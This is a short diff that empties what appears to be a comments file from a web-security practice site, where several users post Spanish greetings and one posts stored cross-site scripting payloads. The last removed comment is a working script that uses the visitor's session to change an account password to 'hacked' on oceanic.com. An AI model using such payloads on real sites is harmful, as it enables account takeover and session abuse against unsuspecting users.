@@ -1,13 +1,1 @@
-andres: hola
-
-juan: Me encanta esta web y los temas que se tratan
-
-daniel: ¡A mi también!
-
-prueba2: Esto no es seguro, me siento confundido con mi identidad
-
-
-guillermo: <script>alert("hello")</script>
-
-guillermo: <script>fetch('http://oceanic.com/changepass.php?newPassword=hacked&id=25&changePassword=Change+Password', {method: 'GET', mode: 'cors', credentials: 'include', headers: {'Cookie': document.cookie.split('; ').find(row => row.startsWith('PHPSESSID')).split('=')[1], 'Referer': 'http://oceanic.com/dashboard.php?id=22'}});</script>
 
